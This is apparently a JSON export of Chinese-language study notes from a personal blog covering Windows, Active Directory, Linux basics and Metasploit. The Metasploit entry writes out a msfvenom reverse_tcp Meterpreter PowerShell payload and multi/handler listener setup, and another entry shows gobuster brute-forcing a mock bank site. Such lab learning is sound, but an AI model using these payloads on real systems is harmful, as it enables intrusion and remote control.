[{"title":"Cyber Security 101 第三部分 Windows和AD基础知识","path":"/Cyber-Security-101-3/","content":"介绍Windows的NTFS文件系统、UAC权限控制、系统配置、资源监控、注册表以及安全相关功能。 介绍AD基础知识（未完待续） Windows11有两个版本，家庭版和专业版，专业版使用 BitLocker 驱动器加密 第一部分文件系统：NTFSNTFS 被称为日志文件系统，发生故障可以使用日志中的信息自动修复磁盘上的文件 权限设置 Read Write Read Execute List Folder Contents Modify Full Control 继承性：子文件夹和文件继承父文件夹的权限 显式权限：可以为特定文件及文件夹设置独立权限，覆盖继承的权限 备用数据流ADS每个文件至少有一个默认数据流 $DATA，ADS 允许文件附加额外的命名数据流，与主数据流并存，可以存储独立的数据。 元数据存储：Windows 常使用 ADS 存储文件的元数据，如文件的摘要信息或缩略图。 安全和隐藏数据：ADS 可用于隐藏数据（例如，恶意软件可能利用 ADS 隐藏恶意代码）。 Windows\\System32C:\\Windows 即包含操作系统的文件夹，环境变量是 %windir% 环境变量存储有关操作系统环境的信息。此信息包括操作系统路径、操作系统使用的处理器数量以及临时文件夹的位置等详细信息 其中的 System32文件夹中的内容对操作系统至关重要。 账户 管理员：可以对系统进行更改。添加用户、删除用户、修改组、修改系统设置等。 标准用户：只能更改属于用户的文件夹文件，而不能执行系统级更改，例如安装程序。 创建用户账户时会为该用户创建一个配置文件。每个用户配置文件文件夹位于 C:\\Users。 每个用户配置文件都包含共同的文件夹：桌面、文件、下载、音乐、图片 在运行窗口：lusrmgr.msc 可以查看用户和群组的详细信息。 User Account Control（UAC）任意管理员用户都可以修改系统设置，引入 UAC 以限制权限滥用。 即管理员用户登录时，默认情况下会话不会以管理员权限运行。当需要执行需要更高级别权限的操作时，系统会提示用户确认是否允许该操作运行。 不适用于内置本地管理员账户，日常不会使用这个账户。 这就是一些安装程序图标右下角会有个盾牌的原因，因为它需要更高级别的权限来安装 UAC 可以设置控制强度 运行提示符：UserAccountControlSettings.exe 设置和控制面板设置日常使用更多 控制面板可以访问更复杂设置和执行复杂操作。 任务管理器Ctrl + Shift + Esc打开任务管理器 可以查看正在运行的程序、进程，以及性能、服务等详细信息。 第二部分系统配置MSConfig 程序（系统配置实用程序）用于高级故障排除，主要帮助诊断启动问题。 直接Windows搜索系统配置 常规：选择Windows启动时加载的设备和服务 引导：为操作系统定义各种启动选项 服务：列出系统配置的所有服务（服务是一种在后台运行的特殊应用程序） 启动：微软建议使用任务管理器来管理启动项 工具：列出各种实用程序，可以通过运行提示符（Win+R）、命令提示符和运行按钮来启动 运行提示符：control.exe 进入控制面板 计算机管理 compmgmt.msc 计算机管理实用程序 系统工具 任务计划程序：可以创建和管理常见任务，运行应用程序、脚本等，并且可以配置任务在任意时间点运行 事件查看器：可以记录五种类型的事件。这些事件记录可以被视为审计线索，用于了解计算机系统的活动。 共享文件夹：其他人可以连接的共享和文件夹的完整列表。 本地用户和组 性能：有 性能监视器 （perfmon）程序 设备管理器：查看和配置硬件，例如禁用连接到计算机的任何硬件。 存储 磁盘管理：执行高级存储任务，设置新驱动器、扩展或缩小分区、分配或更改驱动器号 服务和应用程序：可以查看服务 系统信息 msinfo32.exe 硬件资源：不懂硬件看不懂 组件：可以查看计算机上安装的硬件设备的具体信息 软件环境：可以查看操作系统内置软件以及您已安装软件的信息。此部分还显示其他详细信息，例如环境变量和网络连接。 资源监视器 resmon.exe ？？？ 资源监视器显示每个进程以及CPU、内存、磁盘和网络使用情况的汇总信息，此外还提供有关哪些进程正在使用各个文件句柄和模块的详细信息。 高级筛选功能允许用户隔离与一个或多个进程（应用程序或服务）相关的数据，启动、停止、暂停和恢复服务，以及从用户界面关闭无响应的应用程序。它还包括一个进程分析功能，可以帮助识别死锁进程和文件锁定冲突 命令提示符 cmdhostname # 输出计算机名称 whoami # 输出登录用户的名称 ipconfig # 显示计算机的网络地址设置 cls # 清除屏幕 clear netstat # 显示协议统计信息和当前的 TCP/IP 网络连接 net # 管理网络资源 使用 help (net help) 命令后加 /? 显示说明（net除外） 注册表编辑器 regedt32.exeWindows 注册表 是一个中央分层数据库，用于存储为一个或多个用户、应用程序和硬件设备配置系统所需的信息。 注册表包含 Windows 在运行期间不断引用的信息，例如： 每个用户的个人资料 计算机上安装的应用程序以及每个应用程序可以创建的文档类型 文件夹和应用程序图标的属性表设置 系统上有哪些硬件 正在使用的端口 第三部分 内置安全功能Windows更新WIndows安全 病毒和威胁防护 防火墙和网络保护 应用程序和浏览器控制 设备安全 病毒和威胁防护防火墙防火墙（Firewall）监控和控制通过端口进出的网络流量。检查每一个数据包，决定是允许通过、拒绝，还是丢弃。 Windows防火墙提供三种防火墙配置文件：域、私有和公共 域：域配置文件适用于主机系统可以向域控制器进行身份验证的网络。 私人：私人配置文件是用户分配的配置文件，用于指定私人或家庭网络。 公共：默认配置文件是公共配置文件，用于指定公共网络，例如咖啡店、机场和其他地点的 Wi-Fi 热点。 应用和浏览器控制设备安全 内核隔离：防止攻击将代码插入高安全性进程 安全处理器：使用可信平台模块 (TPM) 技术，提供基于硬件的安全相关功能。TPM 芯片是一种安全的加密处理器。该芯片包含多种物理安全机制，使其具有防篡改功能，恶意软件无法篡改 TPM 的安全功能 数据加密：BitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可以解决丢失、被盗或不当退役的计算机造成的数据盗窃或泄露威胁 卷影复制服务 VSS该服务创建数据的一致性快照（也称为卷影副本或时间点副本）。这些快照可以在特定时间点捕获文件、文件夹或整个驱动器的数据状态，方便备份或恢复。 系统保护功能：通过VSS支持创建、配置和删除还原点，以及执行系统还原。 安全风险：勒索软件可能删除卷影副本，导致无法通过系统还原恢复数据。 第四部分 Active DirectoryWindows 域是一个基于 Active Directory 的集中式网络管理架构，通过域控制器实现用户、计算机和资源的统一管理。它提供单一登录、组策略和安全控制等功能，适合中大型企业或组织。运行Active Directory 服务的服务器称为域控制器 ( DC ) 相比工作组，域更适合需要高效管理和高安全性的场景，但也需要注意域控制器的安全性和权限管理。 集中身份管理：可以轻松从 Active Directory 配置整个网络中的所有用户。 管理安全策略：您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。 Active Directory用户：用户是安全主体之一，是可以对网络中的资源进行操作的对象。 人员：用户通常代表组织中需要访问网络的人员，例如员工。 服务：您还可以定义 IIS 或 MSSQL 等服务所使用的用户。每个服务都需要一个用户才能运行，但服务用户与普通用户不同，因为他们只拥有运行特定服务所需的权限。 机器：每台加入 Active Directory 域的计算机都会创建一个计算机对象。计算机也被视为“安全主体”，机器账户本身指计算机的本地管理员。计算机名称+ $ 就是机器账户名 安全组：类似用户组，可用于向用户授予特定权限。如域管理员、服务器操作员、备份操作员、账户操作员、域用户、域计算机、域控制器 登录域控制器，运行 Active Directory 用户和计算机。 组织单位OU：容器对象，可用于对用户和计算机进行分类。一个用户一次智能属于一个OU 如图，THM组织单元有5个子组织单元。 Delegation 权限委派——– 未完待续","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第二部分 Linux基础知识","path":"/Cyber-Security-101-2/","content":"介绍Linux基础知识：一些基本命令，使用SSH登录Linux设备，与文件系统交互，以及一些实用工具，进程，自动化，与包管理，日志相关知识 Linux是基于UNIX的多个操作系统总称，包括Ubuntu、Debian 基本命令echo Hello # 输出提供的文本 whoami # 输出当前登录的用户 ls # 列出目录下的文件listing,默认参数是当前目录 cd # 更改目录 change directory cat # 输出文件内容 pwd # 打印完整工作目录路径 print working directory find -name passwords.txt # 在当前目录下查找文件 find -name *.txt # 使用*来搜索所有txt文件 grep \"81.143.211.90\" access.log # 搜索文件内容，展示包含所需值的条目 # shell运算符 允许终端后台允许命令 将多个命令组合在一行 > 重定向 >> 与>相同，但是输出不覆盖而是添加在后面 echo Hello > welcome # 将 Hello 输出到文本文件，内容将被覆盖 echo World >> welcome # 将 World 添加到文本文件后（自动换行） 使用SSH登录Linux设备、执行命令、与文件系统交互 SSH（Secure Shell） ：连接远程Linux机器命令行并进行交互 ssh 账户用户名@远程机器IP地址 # 然后还需输入密码 命令参数 ls -a # 将显示工作目录所有内容all，包括隐藏文件 ls --help # manual使用帮助 ls -lh # 列出当前目录下文件详细信息 long、human能阅读的方式 与文件系统交互 touch # 创建文件 mkdir # make directory创建文件夹 cp # copy mv # move rm # remove file # 确定文件类型 rm note # 删除文件 rm -R directory # 删除文件夹 cp note new_note # 复制时可以自动创建新文件 mv note new_note # 移动到新文件夹或新文件，不保留旧文件 file note # 确定文件类型 > note: ASCII text # 表明是一个文本文件 权限ls -lh > -rw-r--r-- 1 user group 4.5K Sep 2 14:30 example.txt > drwxr-xr-x 2 user group 4.0K Sep 2 10:15 mydir 第1个字符：-普通文件，d目录，l符号链接 后9个字符：权限，分为三组，分别表示 文件拥有者权限、所属组权限、其他用户权限 硬链接数（如1或2）：普通文件通常为 1，目录为至少 2（包含自身和 . 目录）。 文件拥有者、文件所属组、文件大小、最后修改时间、文件名 切换用户需要知道用户名和密码 su 其他用户 > Password: # 仅切换到目标身份，但保留当前用户的环境变量，且工作目录不变 su -l 用户名 # 完全切换用户，并切换到HOME目录 目录 ETC：存储操作系统使用的系统文件 var：存储系统上运行的服务或应用经常访问或写入的数据，如日志文件/var/log root：root系统用户的主目录 tmp：用于存储只需访问几次的数据。重启将清除，任何用户默认都可以写入此文件夹，渗透测试中存储、枚举的理想场所 终端文本编辑器nano vim 通用实用工具wgetwget 文件URL SCP（SSH）利用SSH协议在两台计算机之间传输文件，提供身份验证和加密 通过 SOURCE 和 DESTINATION 模型，SCP 允许您： 将文件和目录从当前系统复制到远程系统 scp test.txt user@IP_address:home/user/new.txt 将文件和目录从远程系统复制到当前系统 scp user@IP_address:home/user/test.txt new.txt WebPython3的“HTTPServer”会在当前目录进行文件服务 python3 -m http.server # 启动http服务（8000端口） wget http://10.10.135.215:8000/myfile 进程查看进程 所有进程（加上其他用户运行以及系统进程） ps aux top获取进程的实时统计信息 top 管理进程kill PID> 在进程被终止时可以发送的一些信号： SIGTERM——终止进程，但允许它事先执行一些清理任务 SIGKILL - 终止进程 - 事后不做任何清理 SIGSTOP——停止暂停进程 进程的启动命名空间将进程彼此隔离，只有同一命名空间中的进程可以相互看到 PID为 0 的进程是系统启动时启动的 systemd是第一个启动的进程之一，管理系统进程的初始化系统。任何想要启动的进程都会作为 systemd 的子进程启动。 systemctl 是管理 systemd 服务的命令行工具，可以用于启用或停止、开机启用、禁止 服务 systemctl [option] [service] # start stop enable disable 前台和后台在命令中添加 会让进程在后台运行 CTRL + Z也可以将进程移到后台 fg 命令将后台进程重新带回前台（ foreground） 自动化cron 是一个 Linux 系统中的守护进程（daemon），在系统启动时自动运行，用于定时执行任务（称为 cron 作业，cron jobs）。 它根据预设的时间表（schedule）运行脚本、命令或程序，适合自动化任务，如定时备份、更新系统或启动应用程序。 使用 crontab（table）来管理定时任务 crontab -e # 编辑当前用户的crontab crontab -l # 查看当前用户的crontab 格式 时 日 月 星期 命令 # *表示任意 0 * * * * /usr/bin/google-chrome # 每个小时启动Google Chrome @reboot /var/opt/processes.sh # 系统启动或重启时执行脚本 包管理??????apt 是软件包管理命令，每当更新系统时，包含软件的仓库也会检查更新 apt update apt install [software-name-here] apt remove [software-name-here] 日志 varlogvar/log 存储各种日志 日志轮转：自动管理日志文件大小和存储，定期压缩旧日志、创建新日志、并删除过期日志 以三个日志为例： Apache2 Web服务器： /var/log/apache2/access.log：记录 Web 服务器的访问日志（每次 HTTP 请求的详细信息，如 IP、URL、状态码等）。 /var/log/apache2/error.log：记录 Apache2 的错误信息（如配置错误、页面未找到）。 fail2ban 服务：/var/log/fail2ban.log，记录 fail2ban 服务的运行状态和操作。 防止暴力破解，通过监控日志（如SSH登录）检测异常行为，并临时封禁异常IP UFW服务：/var/log/ufw.log，记录 UFW 防火墙的操作和事件。","categories":["Cyber Security 101"]},{"title":"Metasploit-1 Metasploit介绍","path":"/Metasploit-1/","content":"Metasploit介绍 文件系统 data：某些漏洞所需的二进制文件、单词表、图形、CVE等数据wordlists exploits documentation：包含该框架的可用文档 lib：lib目录包含框架代码库的核心 modules：实际MSF模块 plugins：插件 scripts：脚本 tools：命令行程序 Metasploit库Rex 处理套接字、协议、文本转换等 SSL、SMB、HTTP、XOR、Base64、Unicode Msf::Core 提供基本API 定义 Metasploit 框架 Msf::Base 提供简化的 API 以便框架中使用 模块usrsharemetasploit-frameworkmodules：主模块存储区 ~.msf4modules：自定义模块 exploits漏洞利用模块被定义为使用有效载荷的模块，将在目标系统上执行，即利用漏洞、执行攻击的模块。 按操作系统分类 Auxiliary辅助模块端口扫描、模糊测试、嗅探器 Payloads adapters：根据目标系统的特征调整行为（具有规避或绕过功能） singles：Shell代码、反向Shell等 stagers：为后续有效载荷传递设置环境 stages：Stagers之后传递更大的有效载荷 Encoders、Nops有效载荷：在目标系统中执行的代码 编码器：确保有效载荷完整到达目的地 空指令：确保有效载荷的大小在各种漏洞利用尝试中保持一致。 加载其他模块允许在运行时加载模块 ？？？？？？？ Metasploit对象模型 所有模块都是Ruby类 每个模块都会继承特定类型的基类 所有特定类型的基类，都继承自一个共同的基类 模块共享一组通用API 有效载荷是在运行时由各种组件创建的 Ruby中的Mixins 是一种通过模块实现代码复用的机制，一个Ruby模块可以定义一组方法，这组方法可以被多个类通过include或extend引入，而无需直接继承 通过Mixin机制，可以为 exploit、auxiliary 等模块提供通用功能（如 TCP、HTTP、扫描）。","categories":["Metasploit"]},{"title":"Metasploit-2 Metasploit基础知识","path":"/Metasploit-2/","content":"Metasploit基础知识 Msfconsole介绍 msfconsole是MSF的一体化集中式控制台，能高效访问MSF中几乎所有可用选项。 msfconsole -q # 以安静模式启动msfconsole 支持Tab键补全 Msfconsole命令漏洞利用漏洞分为主动和被动，主动是利用特定主机进行攻击，被动是等主机连接时进行攻击","categories":["Metasploit"]},{"title":"Metasploit-3 Metasploit漏洞扫描","path":"/Metasploit-3/","content":"Metasploit漏洞扫描 扫描IP地址找到开放端口nmap MeterpreterMeterpreter 是一个在内存中运行的动态有效载荷，通过漏洞利用（exploit）注入到目标系统后，提供一个交互式的命令行界面（shell），允许攻击者执行各种高级操作。 Meterpreter 通常以 DLL（动态链接库） 的形式加载到目标进程的内存中，完全在内存中运行，避免写入磁盘以降低被检测的概率。 Meterpreter 使用 TLV 格式来封装其通信数据包，确保攻击者（运行 multihandler 的 Metasploit 控制台）和目标系统（运行 Meterpreter 的进程）之间的数据交换高效、可靠且结构化。 TLV ： type length value 为Powershell创建有效载荷msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker IP LPORT=监听端口 -f psh-cmd -p 生成 payload 适用于 win64 的反向 tcp -f 指定输出格式 psh-cmd将有效载荷生成为powershell命令 输出：一个编码后的 Meterpreter reverse_tcp 有效载荷，以 PowerShell 代码的形式表示。 当目标系统执行这段Powershell脚本时，将连接到指定的LHOST和LPORT 设置监听器来接收反向连接msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp show options # 可选 set LHOST attacker IP> set LPORT 端口> exploit # 开始监听 在Powershell中运行脚本，建立连接","categories":["Metasploit"]},{"title":"Cyber Security 101 第一部分 简介","path":"/Cyber-Security-101-1/","content":"进攻性安全，防御性安全，搜索技巧 简单介绍进攻性安全和防御性安全，总结搜索技巧 进攻性安全：模拟黑客查找系统漏洞示例：入侵一个 FakeBank -u 声明正在扫描的网站 -w 采用单词列表遍历查找隐藏的页面 这里扫描了一个模拟的银行网站，http://fakebank.thm 结果找到bank-transfer转账页面，状态200 OK，代表可以访问 访问http://fakebank.thm/bank-transfer 于是获取了转账权限（可以使用ID进行转账） 总结： 未经授权就可以访问的转账页面，这是一种访问控制漏洞。具体来说是不安全的直接引用 通过操纵 URL 参数、表单数据或请求体中的标识符（如用户 ID、账户 ID 或交易 ID） 无需授权，直接访问或修改他人的资源 修复漏洞需要实施严格的访问控制检查 Optus 数据泄露（2022 年，澳大利亚电信巨头） https://www.upguard.com/blog/how-did-the-optus-data-breach-happen 报告总结了原因： 一个无需身份验证的API可以访问客户敏感信息 递增使用客户标识符（递增ID即可获取所有客户ID） Gobuster工具：Go语言编写的开源命令行工具 可以用于暴力枚举Web目录、文件、DNS子域名等 gobuster dir -u 网站域名 -w 爆破字典 gobuster dns -d 网站域名 -w 爆破字典 防御安全简介：从防御、维护的角度 Security Operations Center (SOC), where we cover Threat Intelligence 情报收集 Digital Forensics and Incident Response (DFIR), where we also cover Malware Analysis 数字取证、事件响应、恶意软件分析 事件响应流程： Security Information and Event Management (SIEM) 系统 是一种集成的安全管理方案， 收集安全相关信息和事件并呈现，如果检测到可疑事件会发出警报 SIEM系统模拟： 多次登录失败不一定有问题，可能只是忘记密码 注意到 IP 143.110.250.149 尝试未授权登录，最终成功，这很可疑，利用一些网站查询IP是否可疑。 查询结果显示非常可疑，并且登录成功，可能有危险，应该进行处理。选择 SOC Team lead ，负责初始的事件处理并报告，之后交给 DFIR 最后封锁这个IP 搜索技巧谷歌搜索: 双引号表示精确搜索 site: 限制域名 - 忽略特定词语 filetype:查找文件类型（而非网页） 专业搜索引擎： Shodan 搜索联网设备 Censys 搜索互联网资产 VirusTotal 文件病毒扫描服务 Have I Been Pwned 检测某个电子邮箱地址是否被泄露 常见漏洞CVE CVE系统，漏洞字典，用CVE ID标准化每个漏洞（https://nvd.nist.gov/） 漏洞数据库，可以找到来自不同作者的漏洞利用代码 查阅官方文档","categories":["Cyber Security 101"]}]